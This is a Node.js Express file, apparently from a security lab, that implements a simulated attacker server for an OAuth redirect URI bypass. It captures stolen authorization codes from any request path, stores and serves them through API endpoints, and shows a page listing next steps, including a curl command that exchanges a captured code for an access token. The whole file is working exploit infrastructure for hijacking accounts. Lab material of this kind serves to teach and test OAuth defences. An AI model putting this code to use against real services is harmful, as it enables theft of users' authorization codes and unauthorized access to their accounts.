/**
 * Attacker's server - captures stolen authorization codes
 *
 * This server simulates an attacker-controlled endpoint that
 * receives the authorization code via the redirect URI bypass.
 */

const express = require('express');
const app = express();
const PORT = process.env.PORT || 4008;

// Store captured codes
const capturedCodes = [];

// API to get captured codes
app.get('/api/codes', (req, res) => {
  res.json({
    count: capturedCodes.length,
    codes: capturedCodes
  });
});

// API to get latest code
app.get('/api/latest', (req, res) => {
  if (capturedCodes.length === 0) {
    return res.status(404).json({ error: 'No codes captured yet' });
  }
  res.json(capturedCodes[capturedCodes.length - 1]);
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', service: 'attacker-server', capturedCodes: capturedCodes.length });
});

// Capture authorization codes at any path
app.all('*', (req, res) => {
  const code = req.query.code;
  const state = req.query.state;
  const error = req.query.error;

  console.log(`[ATTACKER] Request received: ${req.method} ${req.url}`);
  console.log(`[ATTACKER] Query params:`, req.query);

  if (code) {
    console.log(`[ATTACKER] CAPTURED AUTHORIZATION CODE: ${code}`);

    capturedCodes.push({
      code,
      state,
      timestamp: new Date().toISOString(),
      path: req.path,
      query: req.query
    });
  }

  if (error) {
    console.log(`[ATTACKER] Received error: ${error}`);
  }

  // Return a page showing captured code
  res.send(`
    <html>
    <head>
      <title>Code Captured!</title>
      <style>
        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #00ff00; }
        .code { background: #333; padding: 20px; border-radius: 5px; margin: 20px 0; }
        h1 { color: #ff0000; }
      </style>
    </head>
    <body>
      <h1>Authorization Code Captured!</h1>

      ${code ? `
        <div class="code">
          <p><strong>Code:</strong> ${code}</p>
          <p><strong>State:</strong> ${state || 'N/A'}</p>
          <p><strong>Path:</strong> ${req.path}</p>
          <p><strong>Time:</strong> ${new Date().toISOString()}</p>
        </div>

        <h3>Next Steps:</h3>
        <ol>
          <li>Exchange this code for an access token</li>
          <li>Use the token to access /oauth/userinfo</li>
        </ol>

        <h3>Exchange Code Command:</h3>
        <pre>
curl -X POST http://localhost:3009/api/exchange-code \\
  -H "Content-Type: application/json" \\
  -d '{"code": "${code}"}'
        </pre>
      ` : `
        <p>Waiting for authorization code...</p>
        <p>Path: ${req.path}</p>
        <p>Query: ${JSON.stringify(req.query)}</p>
      `}

      <h3>All Captured Codes (${capturedCodes.length}):</h3>
      <pre>${JSON.stringify(capturedCodes, null, 2)}</pre>
    </body>
    </html>
  `);
});

app.listen(PORT, () => {
  console.log(`[ATTACKER] Server running on port ${PORT}`);
  console.log(`[ATTACKER] Waiting for stolen authorization codes...`);
});
